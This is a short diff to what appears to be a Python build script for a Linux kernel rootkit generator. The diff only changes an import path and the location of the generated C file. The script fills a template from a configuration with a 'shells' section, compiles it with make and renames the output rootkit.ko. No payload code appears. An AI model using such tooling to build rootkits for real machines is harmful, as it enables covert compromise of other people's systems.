@@ -4,7 +4,7 @@ import os
 import yaml
 import argparse
 
-from template_generator import TemplateGenerator
+from python_src.template_generator import TemplateGenerator
 
 generator = TemplateGenerator()
 
@@ -52,7 +52,7 @@ if "shells" in rootkit.keys():
 
 template = generator.generate()
 
-f = open("src/rootkit_example.c", "w")
+f = open("rootkit_src/rootkit_example.c", "w")
 f.write(template)
 f.close()
 
@@ -60,4 +60,4 @@ os.system("make")
 os.system("mv rootkit.ko generated_rootkit")
 os.system("make clean")
 os.system("mv generated_rootkit rootkit.ko")
-os.remove("src/rootkit_example.c")
+os.remove("rootkit_src/rootkit_example.c")
